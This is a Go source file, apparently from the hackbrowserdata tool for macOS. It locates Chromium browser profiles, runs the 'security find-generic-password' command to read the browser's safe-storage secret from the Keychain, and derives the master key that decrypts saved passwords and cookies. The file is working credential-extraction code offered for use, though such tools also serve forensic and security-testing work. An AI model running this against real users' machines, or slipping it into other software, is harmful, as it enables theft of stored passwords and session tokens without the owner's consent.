package hackbrowserdata

import (
	"bytes"
	"crypto/sha1"
	"errors"
	"fmt"
	"io/fs"
	"os/exec"
	"path/filepath"
	"strings"

	"golang.org/x/crypto/pbkdf2"

	"github.com/moond4rk/hackbrowserdata/utils/fileutil"
)

type chromium struct {
	name               browser
	storage            string
	profilePath        string
	profilePaths       []string
	disableFindAllUser bool
	masterKey          []byte
	supportedData      []browserDataType
	supportedDataMap   map[browserDataType]struct{}
}

func (c *chromium) Init() error {
	if err := c.initBrowserData(); err != nil {
		return err
	}
	if err := c.initProfile(); err != nil {
		return fmt.Errorf("profile path '%s' does not exist %w", c.profilePath, ErrBrowserNotExists)
	}
	return c.initMasterKey()
}

func (c *chromium) initBrowserData() error {
	if c.supportedDataMap == nil {
		c.supportedDataMap = make(map[browserDataType]struct{})
	}
	for _, v := range c.supportedData {
		c.supportedDataMap[v] = struct{}{}
	}
	return nil
}

func (c *chromium) initProfile() error {
	if !fileutil.IsDirExists(c.profilePath) {
		return ErrBrowserNotExists
	}
	if !c.disableFindAllUser {
		profilesPaths, err := c.findAllProfiles()
		if err != nil {
			return err
		}
		c.profilePaths = profilesPaths
	}
	return nil
}

func (c *chromium) findAllProfiles() ([]string, error) {
	var profiles []string
	root := fileutil.ParentDir(c.profilePath)
	err := filepath.Walk(root, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}
		// if the path ends with "History", add it to the list
		if strings.HasSuffix(path, "History") {
			if !strings.Contains(path, "System Profile") {
				profiles = append(profiles, filepath.Dir(path))
			}
		}

		// calculate the depth of the current path
		depth := len(strings.Split(path, string(filepath.Separator))) - len(strings.Split(root, string(filepath.Separator)))

		// if the depth is more than 2 and it's a directory, skip it
		if info.IsDir() && path != root && depth >= 2 {
			return filepath.SkipDir
		}

		return err
	})
	if err != nil {
		return nil, err
	}
	return profiles, err
}

func (c *chromium) initMasterKey() error {
	var stdout, stderr bytes.Buffer
	args := []string{"find-generic-password", "-wa", strings.TrimSpace(c.storage)}
	cmd := exec.Command("security", args...) //nolint:gosec
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("run security command failed: %w, message %s", err, stderr.String())
	}

	if stderr.Len() > 0 {
		if strings.Contains(stderr.String(), "could not be found") {
			return ErrCouldNotFindInKeychain
		}
		return errors.New(stderr.String())
	}

	secret := bytes.TrimSpace(stdout.Bytes())
	if len(secret) == 0 {
		return ErrNoPasswordInOutput
	}
	salt := []byte("saltysalt")
	// @https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_mac.mm;l=157
	key := pbkdf2.Key(secret, salt, 1003, 16, sha1.New)
	if key == nil {
		return ErrWrongSecurityCommand
	}
	c.masterKey = key
	return nil
}

func (c *chromium) setProfilePath(p string) {
	c.profilePath = p
}

func (c *chromium) setEnableAllUsers(e bool) {
	c.disableFindAllUser = e
}

func (c *chromium) setStorageName(s string) {
	c.storage = s
}
